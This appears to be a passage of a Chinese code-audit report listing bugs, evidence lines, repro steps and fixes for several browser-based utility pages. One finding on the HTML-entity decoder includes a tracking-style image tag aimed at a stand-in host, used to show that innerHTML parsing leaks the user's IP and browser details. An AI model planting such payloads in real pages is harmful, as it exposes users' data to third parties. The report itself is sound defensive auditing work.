- 问题：每个 ID 用 `<div class="code-row">` 渲染（284），`copyResult()` 取 `#output` 的 `textContent`（290）。`textContent` 不保留块级换行，5 个 27 字符 ID 会拼成 135 字符一整串，`alert('已复制')` 仍提示成功；导出按钮走历史表（417-419），历史「结果」列还被 `slice(0,80)` 截断（344）。
- 证据：`tools/it/ksuid-generator.html:284`、`:289-291`、`:338-344`、`:417-419`
- 复现（DOM 语义复算）：生成 5 个 → 复制 → 剪贴板为 `ID1ID2ID3ID4ID5`（无换行/空格），期望每行 1 个；点「导出明细 CSV」→ 得到历史表（时间/count/fmt/结果前 80 字符），不含当前 5 个完整 ID。
- 影响：`tools/it/ksuid-generator.html` —— 粘贴到名单/日志时 5 个 ID 变 1 个非法串，CSV 也不含完整结果。
- 方案：复制改为 `Array.from(output.querySelectorAll('.code-row')).map(e=>e.textContent).join('\n')`；或把 ID 渲染进 `<pre>`；导出改为构建当前结果 CSV（给结果表加 id 后导出）。

### IT-N168 KSUID 英文简介称「20-byte random payload」，实现是 16 字节（中，确认源码缺陷）
- 问题：英文首段写 "time-sortable 27-character identifiers with a 20-byte random payload"（479）；KSUID 总量 20 字节 = 4 字节时间戳 + 16 字节随机（158），代码也只填充 16 字节（281-282）。读者会以为随机部分是 20 字节。
- 证据：`tools/it/ksuid-generator.html:479`、`:158`、`:275-282`、`:267-269`（hex 输出恒 40 字符 = 20 字节总量）
- 复现：源码对照；`hex` 模式输出长度恒 40，可反推总量 20 字节，与"20-byte random payload"（总量会变 40 字节）矛盾。
- 影响：`tools/it/ksuid-generator.html` —— SEO 首段与英文用户对格式的理解错误。
- 方案：改为 "27-character identifiers (4-byte timestamp + 16-byte random payload)"。

### IT-N169 KSUID 深度示例只有 26 字符（非 27），解码时间是 2014-06-02（低，确认源码缺陷）
- 问题：deep-dive 示例 `0ujtsy1p8c9r1l0b0p0n000000`（204）实长 26；解码首 4 字节时间戳 = 1735613 秒 → 2014-06-02T19:00:13Z，不是"当前生成"样例，也无法体现公式（158）"27 字符 base62"的承诺。另 258 `randInt()` 定义后从未调用（死代码）。
- 证据：`tools/it/ksuid-generator.html:204`、`:258`、`:158`、`:261-265`（padStart 27）
- 复现（node 复算）：`'0ujtsy1p8c9r1l0b0p0n000000'.length === 26`；base62 解码 → bytes `[0,26,123,189]` → `(1735613+1400000000)*1000` = 2014-06-02T19:00:13Z。
- 影响：`tools/it/ksuid-generator.html` —— 核心教学示例本身不是合法 KSUID，读者照抄会得到 26 字符串。
- 方案：换成真实生成的 27 字符样例并标注其生成时间；删 `randInt`。

- 留存建议（tools/it/ksuid-generator.html）：①复制按行 `join('\n')`、导出含当前完整结果；②英文简介改 16-byte payload；③示例改 27 字符并标注生成时间。

### IT-N170 calc-3 HEX/RGB/HSL 三路输入都不校验区间，越界得矛盾或错误颜色（中，确认源码缺陷）
- 问题：`hexToRgb` 只校验 6 位长度（238）；`fromRgb` 正则只取 `\d+`（333），300 等越界值照收；`fromHsl` 正则同样只取 `\d+`（343），h=720、s=200 照收；`rgbToHex` 才 clamp（248），而 `rgbToHsl`/`hslToRgb` 不 clamp（253-284），`updateUI` 直接展示未 clamp 的 rgb（316）。
- 证据：`tools/it/calc-3.html:238`、`:246-251`、`:253-273`、`:276-291`、`:303-317`、`:331-339`、`:341-350`
- 复现（node 复算页内函数）：`rgb(300,0,0)` → 实际 `HEX #FF0000` + `HSL hsl(0, 143%, 59%)`（饱和度 143% 不可能），期望 clamp 后 `s=100%` 或拒绝；`hsl(720,100%,50%)` → 实际 `rgb(0,0,0)`（黑），期望 `rgb(255,0,0)`（720≡0）；`hsl(0,200%,50%)` → 实际 `rgb(383,-127,-127)`，而同屏 HEX 显示 `#FF0000`。
- 影响：`tools/it/calc-3.html` —— 同屏 HEX/RGB/HSL 互相矛盾，复制 RGB 会拿到越界值。
- 方案：入口统一 clamp（r/g/b 0–255；`h=((h%360)+360)%360`；s/l 0–100 或拒绝并提示），`hslToRgb` 输出后再 clamp 一次。

### IT-N171 calc-3 预设回调 `fromHex()` 覆盖刚写入的 HSL，红/蓝/绿预设点了没反应（中，确认源码缺陷）
- 问题：`preset.bar(..., function(){ fromHex(); })`（476）；红/蓝/绿预设只写 `hslInput`（473-475），随后 `fromHex()` 读的是 `hexInput`（322-328），`updateUI(rgb,'hex')` 在 `source!=='hsl'` 时把 `hslInput` 改写回旧值（309）。
- 证据：`tools/it/calc-3.html:472-476`、`:307-309`、`:321-329`
- 复现：点「红色」→ 实际 `hslInput` 闪成 `hsl(0,100%,50%)` 后立即变回 `hsl(16, 100%, 60%)`，预览仍是橙色；期望纯红 `#FF0000`。
- 影响：`tools/it/calc-3.html` —— 4 个预设中 3 个视觉效果为零，用户以为预设坏了。
- 方案：回调按字段来源分派（写 hsl 的预设调 `fromHsl()`，默认参数预设调 `fromHex()`），或预设同时写 `hexInput`。

### IT-N172 calc-3 同页渲染两套预设条（声明式 + `#calc_3Presets` 自动宿主）（中，确认源码缺陷）
- 问题：正文 134 已有 `data-tb="preset"`（仅"默认参数"1 条），`__calc_3Presets()` 又调 `TBKit.preset.bar('#calc_3Presets', 4 条)`（472）；页面没有 `id="calc_3Presets"`，`preset.ensureHost()` 会在首个 `.input-row`（132）前新建宿主（`js/tool-kit.js:1013-1033`），于是出现上下两条「常用场景」。
- 证据：`tools/it/calc-3.html:132`、`:134`、`:470-475`、`js/tool-kit.js:1035-1039`
- 复现：打开页 → 工具栏上方两条预设按钮组（1 个 + 4 个）；期望只留一组 4 个。
- 影响：`tools/it/calc-3.html` —— 重复 UI，且两条预设行为不同（声明式那条能正常生效）。
- 方案：删除 134 的声明式 preset div（或删 `__calc_3Presets`），统一保留 4 条并显式放宿主 div。

### IT-N173 calc-3 文档承诺 `#RGB` 简写与 8 位 alpha，实现只接受 6 位且输入框限长 7（低，确认源码缺陷）
- 问题：123 "`#RGB` 简写会等比扩展"、187 "#RRGGBB 或 #RGB 简写，另有 8 位含 alpha"；`hexToRgb` 要求 `^[0-9A-Fa-f]{6}$`（238），输入框 `maxlength="7"`（136）连 `#RRGGBBAA`（9 字符）都输不进去。
- 证据：`tools/it/calc-3.html:123`、`:187`、`:136`、`:236-238`
- 复现：输入 `#F00` → 实际提示"请输入有效的 HEX 颜色"；输入 `#FF6B3580` → 被截成 `#FF6B35` 且 alpha 丢失；期望 `#F00 → #FF0000`。
- 影响：`tools/it/calc-3.html` —— 文档承诺两种常见写法都不可用。
- 方案：支持 3/4/6/8 位（3 位按位扩展，4/8 位取 alpha 并展示），同步放宽 `maxlength`。

- 留存建议（tools/it/calc-3.html）：①三路入口统一区间校验 + clamp；②预设回调按来源调用 `fromHsl`；③删重复预设条；④补 `#RGB`/8 位 alpha 或删掉该承诺。

### IT-N174 matrix 改维度后不点「构建矩阵」直接点「计算转置」抛 TypeError，结果区空白（高，确认源码缺陷）
- 问题：`rows/cols` 输入框无 oninput 重建（170-171），`calculate()` 直接 `getM(r,c)`，而 `getM` 按新维度读取 `a<i*c+j>`（268）。仅 a0…a(旧r*旧c-1) 存在，新维度需要更多格时 `getElementById` 返回 null，`.value` 抛 TypeError；`calculate()` 无 try/catch（281-296），异常冒泡，输出区保持"点击「计算转置」查看结果"。
- 证据：`tools/it/matrix-transpose.html:170-171`、`:174-175`、`:257-260`、`:266-269`、`:281-296`
- 复现：默认 2×3 → 把「行」改成 3（不点构建）→ 点「计算转置」：实际 `Uncaught TypeError: Cannot read properties of null (reading 'value')`，无结果；期望自动重建或提示先构建。另 `行=2.5` → `build()` 用 `i<r*c` 造出 8 格（260），`grid-template-columns:repeat(2.5,70px)` 非法（259），`getM` 按 3 行读到 a8 → 同类 TypeError。
- 影响：`tools/it/matrix-transpose.html` —— 先改维度再算是最自然路径，直接静默报错。
- 方案：`calculate()` 前比对 DOM 单元格数与 `r*c`，不一致先 `build()`（保留已有值）；`rows/cols` 用 `Number.isInteger` + 1–6 校验，非法值提示且不构建。

### IT-N175 matrix 结果用 `toLocaleString()` 展示：千分位、最多 3 位小数、大数精度溢出（中，确认源码缺陷）
- 问题：`fmt` 先 `Math.round(x*1e10)/1e10` 再 `toLocaleString()`（272）。`toLocaleString()` 默认 `maximumFractionDigits=3`，转置值被二次四舍五入；同时插入千分位逗号，`1,234.5` 无法直接复制回输入框；`x*1e10` 在 |x|≳1e13 时溢出双精度有效位产生伪小数。
- 证据：`tools/it/matrix-transpose.html:270-272`、`:278`
- 复现（node）：`1.2345678 → "1.235"`、`0.123456789 → "0.123"`、`1234.5 → "1,234.5"`、`123456789012345 → "123,456,789,012,345.02"`（末两位是运算噪声）。期望 `1.2345678` 原样且无千分位。
- 影响：`tools/it/matrix-transpose.html` —— 转置结果被 UI 抹掉精度，抄回计算会得到不同值。
- 方案：去掉 `toLocaleString()`，改用 `String()` 或固定 6–12 位有效数字；超大数改指数表示。

### IT-N176 matrix 空单元格/非数字静默按 0，维度 0 或 >6 无提示（低，确认源码缺陷）
- 问题：`getM` `isNaN(v)?0:v`（268）把空白都当 0，转置照常"成功"；`build` 只按 `+value` 造格（258-260），行填 0 → 0 个格、`repeat(0,70px)` 非法，输出仍写 `Aᵀ（3×0）`；行填 7 也照造 49 格（min/max 只是 spinner 提示）。
- 证据：`tools/it/matrix-transpose.html:258-260`、`:266-269`、`:275`、`:286`
- 复现：清空 a0 → 计算实际得 `A[1][1]=0` 且无提示；行填 0 → 输出"3×0"空表；列填 0 → `matrixHTML([])` 返回空串（275），输出只剩标题；行填 7 → 49 格照算。
- 影响：`tools/it/matrix-transpose.html` —— 空白被当真实 0，统计/线代结果被悄悄改写。
- 方案：空/非数单元格标红并中止计算；维度做 1–6 整数校验并给出 `err` 文案。

### IT-N177 matrix「导出明细 CSV」导的是历史表，不含转置矩阵（低，确认源码缺陷）
- 问题：按钮绑定 `exportTable('#matrix_transposeTable')`（413-415），该 id 是历史表容器；当前转置矩阵渲染在 `#output`（286），没有可导出的表格 id，历史只存输入各格 + 截断的结果文本。
- 证据：`tools/it/matrix-transpose.html:413-415`、`:286`、`:175`、`:349-357`（历史表）
- 复现：2×3 算完后点导出 → CSV 列为 时间/rows/cols/a0…/结果，结果列是截断文本，无 3×2 的 Aᵀ。
- 影响：`tools/it/matrix-transpose.html` —— 导出按钮名不副实。
- 方案：给结果表加 id（如 `#transposeResultTable`）并导出它，或在导出函数里现场生成 Aᵀ CSV。

- 留存建议（tools/it/matrix-transpose.html）：①计算前校验/重建单元格并做整数维度校验；②`fmt` 去 `toLocaleString` 保留精度；③空值校验并提示；④导出改导转置结果。

### IT-N178 HTTP Cookie 英文简介宣称 "Parse and build ... headers"，页面只有静态速查（中，确认源码缺陷）
- 问题：169 的英文文案写 "Parse and build HTTP Cookie and Set-Cookie headers with their attributes."；页面只有 `#searchInput`（171）+ 静态 `COMMANDS` 列表 + 图表/明细表，没有任何解析/构建输入框或函数。
- 证据：`tools/it/http-cookies.html:169`、`:171`、`:478-541`、`:650-661`
- 复现：英文态首段承诺解析/构建，但全页无对应控件，只能搜索 26 条属性说明；与中文 `data-zh`"属性与 JS 操作方法"的口径也不一致。
- 影响：`tools/it/http-cookies.html` —— 英文用户按简介预期找解析器，找不到即流失。
- 方案：英文改为 "Reference for Cookie attributes ... and JS operations"，或新增一个 Cookie 头解析/构建小工具。

### IT-N179 Cookie 示例 `Expires=Wed, 21 Oct 2025 ...` 星期与日期不符且已过期（中，确认源码缺陷）
- 问题：280 沿用 RFC 6265 的 `Wed, 21 Oct 2015` 只改年份为 2025，未改星期。2025-10-21 是周二；且相对当前日期（2026-11）已过期。
- 证据：`tools/it/http-cookies.html:280`
- 复现（node）：`new Date('2025-10-21T07:28:00Z').toUTCString()` → `Tue, 21 Oct 2025 07:28:00 GMT`（非 Wed）；与 `new Date('2026-11-04')` 比较为已过期。
- 影响：`tools/it/http-cookies.html` —— 作为"过期时间点"示例既演示错误星期，又演示已过期时间，用户照抄会立刻删 Cookie。
- 方案：换未过期且星期正确的日期（如 `Thu, 21 Oct 2027 07:28:00 GMT`，已实算），或保留 RFC 原文 2015 并注明"格式示例，日期已过期"。

### IT-N180 Cookie 属性表未说明 `Max-Age` ≤0 即删除，中文界面表头固定英文（低，确认源码缺陷）
- 问题：283-288 `Max-Age` desc 只写"存活秒数（相对，优先于 Expires）"，params 写"正数/0/负数"却未说明 0/负值即立即删除（等价于删除 Cookie）；这是与 Expires 并列最常用的删除手段。另 `__ckTable()` 658 无条件 `th1.textContent='Attribute'`，中文界面表头混英文（SameSite 的默认行为在 331-333 已有说明，不算缺失）。
- 证据：`tools/it/http-cookies.html:283-288`、`:657-660`
- 复现：查 `Max-Age` 条目只看到"正数/0/负数"，无删除语义；中文态打开「明细表」→ 表头为 `# / Attribute / 分类 / 说明`（其余三列中文）。
- 影响：`tools/it/http-cookies.html` —— 最容易踩的"用 0/负值删除 Cookie"没写清；UI 语言不统一。
- 方案：`Max-Age` desc 补"0 或负数 → 立即删除"；`th1` 按 `en` 切换 `Attribute/属性`。

- 留存建议（tools/it/http-cookies.html）：①英文简介改口径或补解析器；②Expires 示例换未过期且星期正确；③补 `Max-Age`≤0 删除语义并统一表头语言。

### IT-N181 文本转 ASCII 参照表把制表符写成 `9(制表) 57 39`，与"32–126 可打印"标题矛盾（中，确认源码缺陷）
- 问题：171 `<td>9(制表)</td><td>57</td><td>39</td>`：十进制 57/0x39 是字符 `9`，TAB 是 9/0x09。该表标题（165）明确"可打印字符（32–126）"，TAB(9) 不在范围。另 A(65/41) 在 169 与 173 重复出现。
- 证据：`tools/it/text-to-ascii.html:165-173`
- 复现：对照 ASCII 表，TAB → 9 / 09；57 / 39 → `9`，表中该行自相矛盾；重复 A 行可在同表两处读到。
- 影响：`tools/it/text-to-ascii.html` —— 初学者把 TAB 记成 57，写解析器/校验会出错；参照表是页面主要价值之一。
- 方案：该行改为 `9(TAB) | 9 | 09` 并移出"可打印"表（或单列控制字符表）；删重复 A 行。

### IT-N182 文本转 ASCII 按 UTF-16 单元计数，1 个 emoji 被报成"跳过 2 个字符"（中，确认源码缺陷）
- 问题：`for(i=0;i<s.length;i++)` + `charAt(i)`（217-218）把代理对拆成两个单元，两单元码点都 >127 各 `skipped++`（219），提示"已跳过 N 个非 ASCII 字符"（227）。
- 证据：`tools/it/text-to-ascii.html:217-221`、`:227`、`:100`（"非 ASCII 会被跳过"）
- 复现（node）：`a😀b` → `skipped=2`（实际非 ASCII 字符 1 个）；单个 `😀` → 报"跳过 2 个"。
- 影响：`tools/it/text-to-ascii.html` —— 计数翻倍，表情/生僻字多的文本会被误判。
- 方案：用 `for(const ch of s)` + `codePointAt(0)` 按码点遍历（保留完整代理对）；或文案改为"跳过 N 个 UTF-16 编码单元"。

### IT-N183 文本转 ASCII 十六进制不补位，与公式"0x 加两位大写十六进制"不符（低，确认源码缺陷）
- 问题：102 公式写"0x 加两位大写十六进制"；221 `'0x'+code.toString(16).toUpperCase()` 对码点 <16 只出 1 位。表中 ≥0x20 的行看不出，控制字符（换行 10、TAB 9）会显示 `0xA`、`0x9`。
- 证据：`tools/it/text-to-ascii.html:102`、`:221`、`:220`（二进制已补 8 位）
- 复现（node）：code 10 → `0xA`（期望 `0x0A`）；code 9 → `0x9`。二进制列同为 8 位补齐，风格不一致。
- 影响：`tools/it/text-to-ascii.html` —— 用户以为十六进制列漏字符，且与公式不符。
- 方案：`toString(16).toUpperCase().padStart(2,'0')`。

### IT-N184 文本转 ASCII「导出明细 CSV」导历史表而非逐字符表（低，确认源码缺陷）
- 问题：逐字符表由 `calcTool()` 拼成 HTML（224-225）写入 `#result`，无 id；导出函数 `exportTable('#text_to_asciiTable')`（327）导的是历史表（269），历史「结果」还被 `slice(0,80)` 截断（249-251）。首屏 `calcTool()` 在 231 直接执行且未走 history，若用户未再点「计算」就导出，CSV 为空。
- 证据：`tools/it/text-to-ascii.html:224-225`、`:269`、`:249-251`、`:327`、`:231`
- 复现：打开页 → 直接点导出 → 空 CSV；点「计算」后导出 → 仅 1 行历史（时间/输入/结果前 80 字符），无 逐字符四列。
- 影响：`tools/it/text-to-ascii.html` —— 导出与"明细"不符。
- 方案：给逐字符表加 id 并导出它（列：字符/十进制/十六进制/二进制）。

- 留存建议（tools/it/text-to-ascii.html）：①修正 TAB 行并删重复 A；②按码点遍历修正跳过计数；③hex 补两位；④导出逐字符表。

### IT-N185 Shell「压缩」把 `&&`/`|` 续行、`else`、`case … in`、heredoc 拼成非法脚本（高，确认源码缺陷）
- 问题：`minifyShell()` 逐行 trim 后按 `needsSep` 决定换行，否则追加 `'; '`（315-325）。`needsSep` 只覆盖 `; { ( \ then do`、下一行以 then/do/fi/done/else/elif/esac/}/) 开头、`#!`，不覆盖行尾 `&&`/`||`/`|`、`else` 行本身、`case … in`；heredoc 也被逐行当普通命令拼接。
- 证据：`tools/it/shell-script-formatter.html:311-329`（判定 323、拼接 324）、`:214`（FAQ"仅调整空白"）
- 复现（用页内函数复算，输出交 `bash -n`）：
  - `if true; then\n cmd1 &&\n cmd2\nfi` → `cmd1 &&; cmd2` → `syntax error near unexpected token ';'`
  - `if true; then\necho a\nelse\necho b\nfi` → `else; echo b` → 同错
  - `case $1 in … esac` → `case $1 in; start); …` → 同错
  - `cat <<EOF\nhello world\nEOF\necho done` → `cat <<EOF; hello world; EOF; echo done;`（`bash -n` 通过但语义破坏，body 变命令）
- 影响：`tools/it/shell-script-formatter.html` —— 页面主打的"压缩"对最常见的多行条件/管道/case/heredoc 直接产出跑不起来的脚本；FAQ 214 的"仅调整空白"与实际插入分号不符。
- 方案：行尾为 `&& || | \` 时保留换行；`else/elif/do/then/case … in` 单独成行；检测到 heredoc 整段原样保留；压缩后跑一次关键字/括号平衡提示。

### IT-N186 Shell 格式化把行尾 `)` 误判为 case 分支模式，后续缩进整体漂移（中，确认源码缺陷）
- 问题：`isCasePat = /^([A-Za-z0-9_*?\-|]+\)|.+\))/.test(trimmed)`（300）的第二分支 `.+\)` 命中任何含 `)` 的行；303 只要 `endsWith(')')` 就 `depth++`。于是 `echo $(date)`、`arr=(1 2 3)` 都被当成 case 分支。
- 证据：`tools/it/shell-script-formatter.html:300`、`:302-305`
- 复现（node 复算页内 `formatShell`，4 空格）：
  - `if true; then\necho $(date)\necho hi\nfi` → 实际 `    echo $(date)` / `        echo hi` / `    fi`；期望 4/4/0。
  - `arr=(1 2 3)\necho done` → 实际 `    echo done`；期望 0。
- 影响：`tools/it/shell-script-formatter.html` —— 命令替换/数组赋值后整段缩进错位，格式化结果不可信。
- 方案：case 分支判定收紧为"行首到第一个 `)` 之间无空白且 `)` 是行尾"（如 `^[^\s()'"]+\)$`），且仅在 `case` 块内（记录 case 深度）启用。

### IT-N187 Shell 单独成行的 `then`/`do` 被多缩进一级且深度多开一层（中，确认源码缺陷）
- 问题：本行减级只处理 `fi/done/esac`（296）与 `else/elif`（298），`then/do` 不减级；输出后 302 又因 `endsWith('then'|'do')` 增级，导致 `then` 比 `if` 深一级、正文再深一级、`fi` 落在中间层。
- 证据：`tools/it/shell-script-formatter.html:296-302`
- 复现（4 空格）`if [ "$x" = 1 ]\nthen\necho hi\nfi` → 实际 `    then` / `        echo hi` / `    fi`；期望 `then` 与 `if` 同列（至少 `fi` 与 `if` 同列）。
- 影响：`tools/it/shell-script-formatter.html` —— 多行 then/do 是长条件的常见写法，格式化后层级错乱。
- 方案：本行减级条件加入 `^then\b|^do\b`，并避免对独占的 `then/do` 行再增级（增级只发生在 `if/for/while/until` 首行）。

### IT-N188 Shell 函数/块闭合 `}` 未先减级，输出比 `{` 深一级（中，确认源码缺陷）
- 问题：`dedMid` 只含 `fi|done|esac`（278），`}` 的减级放在输出后（304 的 `funcClose`/`=== '}'`），于是 `}` 按当前 depth 缩进后再减级。
- 证据：`tools/it/shell-script-formatter.html:278`、`:296`、`:304`
- 复现：载入页面自带示例点「美化」（4 空格）→ 实际 `backup() {` 在 0、`if` 在 4、`}` 输出为 `    }`；期望 `}` 与 `backup() {` 同列。
- 影响：`tools/it/shell-script-formatter.html` —— 自带示例第一次点"美化"就产出不规范收尾括号。
- 方案：把 `^\}` 并入本行减级集合（296 之前），304 只做深度回落。

### IT-N189 Shell heredoc 起始行不参与缩进，且正则把字符串/注释里的 `<<` 当 here-doc（低，确认源码缺陷）
- 问题：命中 heredoc 的行直接 `out.push(line)`（289），块内保持原始列位；`<<` 正则（288）不区分上下文，`echo "a << b"`、`# see << docs` 都会命中并把后续所有行当 heredoc 原样输出。
- 证据：`tools/it/shell-script-formatter.html:288-289`、`:283-287`
- 复现（node）：`if true; then\ncat <<EOF\nhello\nEOF\necho after\nfi` → `cat <<EOF` 在 0 列（块内应为 4）；`echo "a << b"\necho x` → 命中正则（group2=`b`），后续行不再格式化。
- 影响：`tools/it/shell-script-formatter.html` —— 带 heredoc 的脚本整段失去缩进；一句普通字符串即可让格式化"失效"。
- 方案：heredoc 起始行按当前 depth 缩进；正则限定 `<<` 前为空白/重定向位置（如 `/(^|\s)<<-?\s*.../`）并排除引号内与注释行。

### IT-N190 Shell「校验」用全局关键字计数，字符串/注释误计；且结果覆盖格式化输出（低，确认源码缺陷）
- 问题：`doValidate()` 用 `\b(if|for|while|until|case)\b` 与 `\b(fi|done|esac)\b` 统计全文（336-337），不剥离注释/引号，`echo "fi"` 会被当成一个结束块；`{`/`}`/`(`/`)` 也按字符计数（338-341），`${x}`、`$(cmd)` 被计入。最后 `setOut(stats)`（355）把「输出结果」替换成统计文本，格式化结果丢失。
- 证据：`tools/it/shell-script-formatter.html:336-341`、`:342-355`
- 复现：输入 `echo "fi"` → 实际"块未平衡：开始 0 / 结束 1"；输入 `echo "${x}"` → 花括号 1/1 但语义错；点「校验」后已生成的美化结果被统计覆盖。
- 影响：`tools/it/shell-script-formatter.html` —— 校验误报/漏报，且一键"校验"会毁掉已生成结果。
- 方案：校验前剥离 `#` 注释与引号内文本；只统计行首关键字与独占行 `fi/done/esac`；统计写入独立区域，不覆盖 `#output`。

- 留存建议（tools/it/shell-script-formatter.html）：①压缩保留 `&&`/`|`/`else`/`case`/heredoc 换行；②case 分支判定收紧；③`then/do` 与 `}` 本行减级；④heredoc 上下文识别；⑤校验剥离注释/引号且不覆盖输出。

### IT-N191 高级单位换算「温度 ℃」预设传 `from:"℃"`，被校验直接拒绝（中，确认源码缺陷）
- 问题：预设 356 `values:{cat:'temp', val:'100', from:'℃'}`；温度分支只接受 `['C','F','K']`（236），点击后直接输出"⚠️ 温度单位请用 C/F/K。"，100℃ 不会换算。
- 证据：`tools/it/unit-converter-advanced.html:356`、`:235-238`
- 复现：点「温度 ℃」→ 实际提示错误、无结果；期望 `100 → 212.00°F / 373.15K`。
- 影响：`tools/it/unit-converter-advanced.html` —— 4 个预设中 1 个完全不可用，且是唯一带偏移量的类别。
- 方案：预设改 `from:'C'`（或让 `℃/°C/°F/℉` 归一化为 `C/F`），计算前做别名归一。

### IT-N192 文档列「压强与能量」类别，UI 下拉与因子表都没有（中，确认源码缺陷）
- 问题：108 写类别含"压强与能量"；`<select id="cat">`（118）只有 length/mass/temp/area/volume/time/speed/data；`U`（222-230）也无 pressure/energy 因子表，`U[cat]` 永不命中。
- 证据：`tools/it/unit-converter-advanced.html:108`、`:118`、`:222-230`、`:242`
- 复现：下拉里找不到压强/能量；若手工把 select 值改成 `pressure` → 实际"类别 pressure 不支持单位…可选项为空"，期望有 Pa/kPa/bar/psi 等。
- 影响：`tools/it/unit-converter-advanced.html` —— 文档承诺的 10 类里 2 类不存在。
- 方案：删掉该表述，或补 `pressure`（pa/kpa/mpa/bar/psi/atm/mmhg）与 `energy`（j/kj/kcal/wh/kwh/btu）。

### IT-N193 极小值被 `toFixed(6)` + 去零吞成 `0`（1 bit → GB/TB 显示 0）（中，确认源码缺陷）
- 问题：245 `nv.toFixed(6).replace(/\.?0+$/,'')`。|nv|<5e-7 时 `toFixed(6)` 已是 `0.000000`，去零后为 `0`，非零换算值被显示成 0。
- 证据：`tools/it/unit-converter-advanced.html:245`、`:229`
- 复现（node 复算页内公式）：1 bit → GB = `0.125/1073741824 = 1.164e-10` → 实际显示 `0`；→ TB 同样 `0`。期望 `1.164153e-10`（或科学计数）。
- 影响：`tools/it/unit-converter-advanced.html` —— 小单位换大单位结果变成 0，用户会以为无换算关系。
- 方案：数量级 <1e-6 时改用 `toExponential(6)` 或按有效数字格式化，文档同步说明。

### IT-N194 数值框清空/非法输入静默当 0；温度源单位大小写敏感（低，确认源码缺陷）
- 问题：`num('val')` `parseFloat` 后 `isNaN?0`（219），清空数值仍按 0 换算并显示一串 0；温度分支 `['C','F','K'].includes(from)`（236）区分大小写，`c` 被拒。另 128 行 `</div` 缺 `>`。
- 证据：`tools/it/unit-converter-advanced.html:219`、`:232-233`、`:236`、`:128`
- 复现：清空数值 → 实际所有目标单位 `0`，无提示；`from=k`（小写）→ 提示错误（期望大小写不敏感）。
- 影响：`tools/it/unit-converter-advanced.html` —— 空值被当真实 0；小写输入被无谓拒绝；`</div` 未闭合可能影响后续块结构。
- 方案：空值时不计算并提示"请输入数值"；温度单位 `toUpperCase()` 后比较并接受 `°C/℃` 别名；补 `</div>`。

### IT-N195 长度表用 `nm` 表示海里（1852 m），与纳米缩写冲突且无别名（低，确认源码缺陷）
- 问题：223 `length:{…,nm:1852}`。`nm` 在 SI 中是 nanometre（1e-9 m），此处按 nautical mile（1852 m）解释；无 `nmi`/海里别名，也无 `um` 等微米单位。
- 证据：`tools/it/unit-converter-advanced.html:223`、`:242`
- 复现：用户按常识输入 `1 nm` 期望 `1e-9 m`，实际得到 `1.852 km`（差 12 个数量级）；错误提示把可选单位列为 `…,in,nm`。
- 影响：`tools/it/unit-converter-advanced.html` —— 单位语义误导，结果量级错得离谱。
- 方案：改键为 `nmi`（UI 标"海里"），另补 `um:1e-6`。

- 留存建议（tools/it/unit-converter-advanced.html）：①温度预设与单位别名归一；②补或删压强/能量；③小值改科学计数；④空值提示；⑤`nm` 改 `nmi` 并补 `um`。

### IT-N196 HTML 实体解码未校验码点范围，`&#1114112;` 抛未捕获 RangeError（中，确认源码缺陷）
- 问题：`dec()` 的十进制/十六进制分支直接 `String.fromCodePoint(parseInt(...))`（305-306），未校验 0–0x10FFFF；越界码点抛 `RangeError: Invalid code point`，异常从 `onclick` 冒泡，`#output` 不更新、无提示。
- 证据：`tools/it/html-entities-encode.html:298-308`（`:305-306`）
- 复现（node）`String.fromCodePoint(1114112)` → `RangeError: Invalid code point 1114112`；页面输入 `&#1114112;` → 控制台报错、结果区保持旧值；期望原样保留该文本或提示"码点超出 Unicode 范围"。
- 影响：`tools/it/html-entities-encode.html` —— 解码按钮对畸形输入静默失效，用户以为复制/粘贴丢了内容。
- 方案：`cp<=0x10FFFF ? String.fromCodePoint(cp) : m`，或整段 try/catch 后提示；同时过滤 surrogate 区（0xD800–0xDFFF）。

### IT-N197 HTML 实体解码用 `div.innerHTML` 注入用户输入，会触发第三方资源请求（中，确认源码缺陷）
- 问题：`div.innerHTML = text`（302）对任意输入（即使不含实体）都先建完整 DOM；粘贴 `<img src="https://x/y.png">`、`<link>`、`<iframe>` 时浏览器会请求该 URL。元素虽未挂载，`img` 仍会加载；`<script>` 不执行，故非 XSS，而是**出站请求/隐私**问题，与页面及 meta 宣称的"数据不上传、纯前端"（`:10`）冲突。
- 证据：`tools/it/html-entities-encode.html:301-303`、`:177`（`<textarea id="input">`）、`:10`（meta description）
- 复现：输入 `<img src="https://example.com/track.png">` 点「解码」→ DevTools Network 出现对 `example.com` 的请求；期望零请求（纯本地解码）。
- 影响：`tools/it/html-entities-encode.html` —— 用户粘贴含图/链接的 HTML 片段时会向第三方泄露（至少泄露 IP 与 UA），违背隐私承诺，离线场景还会卡顿。
- 方案：改用惰性解析 `new DOMParser().parseFromString(text,'text/html')`（不加载资源），或先去标签再 `innerHTML`，或纯实体表替换（不建 DOM）。

### IT-N198 HTML 实体解码两条路径不一致：含分号实体存在时，无分号 legacy 实体不被解码（低，确认源码缺陷）
- 问题：304 只要文本含任一**带分号**实体，就整段走手写替换（305-307）；三条正则都要求结尾 `;`。同一段里的 `&#65`、`&amp`（HTML 允许省略分号的 legacy 写法）因此不被解码，而 `div.textContent` 原本能解。结果取决于输入里是否还有别的带分号实体。
- 证据：`tools/it/html-entities-encode.html:304-307`
- 复现：输入 `&#65; &amp` → 实际 `A &amp`（`&amp` 未解）；输入仅 `&amp` → 走 textContent 分支 → `&`。同一实体因上下文不同结果不同。
- 影响：`tools/it/html-entities-encode.html` —— 批量清洗混合写法时结果不可预测。
- 方案：统一出口（手写替换后再用 `DOMParser` 文本节点兜底），或补 `&#\d+` / `&#x[0-9a-f]+` 无分号正则并说明取舍。

- 留存建议（tools/it/html-entities-encode.html）：①解码前校验码点范围并捕获异常；②改用 `DOMParser`/本地实体表，避免 `innerHTML` 触发出站请求；③统一有/无分号解码路径；④（可选）补齐常用命名实体并删"完整"表述。

### 承诺 vs 实际（Q 批专项）
- `tools/it/ksuid-generator.html:479`：英文简介"20-byte random payload"，实现 16 字节（281-282）；同段"27-character"但 hex 选项输出 40 字符（170、267-269）。
- `tools/it/calc-3.html:123`、`:187`：承诺 `#RGB` 简写与 8 位 alpha，`hexToRgb` 只收 6 位（238），`maxlength=7`（136）连 8 位都输不进。
- `tools/it/matrix-transpose.html:175`：按钮"导出明细 CSV"实际导历史表（413-415），无 Aᵀ 结果。
- `tools/it/http-cookies.html:169`：英文承诺 parse/build Set-Cookie 头，页面无解析器（仅 171 搜索 + 静态 `COMMANDS`）。
- `tools/it/text-to-ascii.html:102`：承诺十六进制"两位"，实际 1 位（221）；`:119` 按钮"导出明细 CSV"实为历史表（327）。
